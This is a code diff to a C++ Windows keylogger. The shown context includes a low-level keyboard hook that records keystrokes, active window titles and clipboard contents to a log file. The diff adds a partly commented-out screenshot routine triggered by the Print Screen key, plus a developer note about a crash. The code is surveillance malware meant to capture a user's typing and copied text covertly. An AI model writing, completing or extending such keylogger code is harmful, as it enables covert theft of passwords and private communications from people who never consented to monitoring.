@@ -85,6 +85,23 @@ void writeClipboardChange(){
 	logfile << getClipboardText() << "*" << std::endl << std::endl;
 }
 
+void	takeScreen(){
+	/*HDC hScreenDC = GetDC(nullptr);
+	HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
+	int width = GetDeviceCaps(hScreenDC,HORZRES);
+	int height = GetDeviceCaps(hScreenDC,VERTRES);
+	HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC,width,height);
+	HBITMAP hOldBitmap = static_cast<HBITMAP>(SelectObject(hMemoryDC,hBitmap));
+	BitBlt(hMemoryDC,0,0,width,height,hScreenDC,0,0,SRCCOPY);
+	hBitmap = static_cast<HBITMAP>(SelectObject(hMemoryDC,hOldBitmap));
+	DeleteDC(hMemoryDC);
+	DeleteDC(hScreenDC);*/
+	Sleep(400);
+	std::cout<<"Format Bitmap: "<<IsClipboardFormatAvailable(CF_BITMAP)<<"\n";
+    std::cout<<"Format DIB: "<<IsClipboardFormatAvailable(CF_DIB)<<"\n";
+    std::cout<<"Format DIBv5: "<<IsClipboardFormatAvailable(CF_DIBV5)<<"\n";
+}
+
 /* TranslateKeys() is called on each keypress and simply converts the key press from vkCode to a writable character
 -if vkCode == special key: returns a descriptive wstring for that key.
 -else ToUnicodeEx() is called to return the proper unicode to handle all languages and special characters.*/
@@ -118,8 +135,10 @@ std::wstring translateKeys(DWORD vkCode, DWORD scanCode){
 		result = L"[UP ARROW]";
 	else if (vkCode == VK_DOWN)
 		result = L"[DOWN ARROW]";
-	else if (vkCode == VK_SNAPSHOT)
+	else if (vkCode == VK_SNAPSHOT){
 		result = L"[PRINT SCREEN]";
+		takeScreen();
+	}
 	else if (vkCode == VK_NUMLOCK)
 		result = L"[NUMLOCK]";
 	else if (vkCode == VK_LWIN)
@@ -163,6 +182,8 @@ LRESULT CALLBACK keyboardHook(int code, WPARAM wParam, LPARAM lParam){
 	std::wstring currentWindowTitle;
 	DWORD currentClipboardSequenceNumber;
 
+
+	//PROGRAM EXITS WHEN TAKING A SCREEN (CLIPBOARD DATA ISN't WRITABLE, probably should check before with IsClipboardFormatAvailable)
     if (wParam == WM_KEYDOWN){
 		currentWindowTitle = getWindowTitle();
 		currentClipboardSequenceNumber = GetClipboardSequenceNumber();
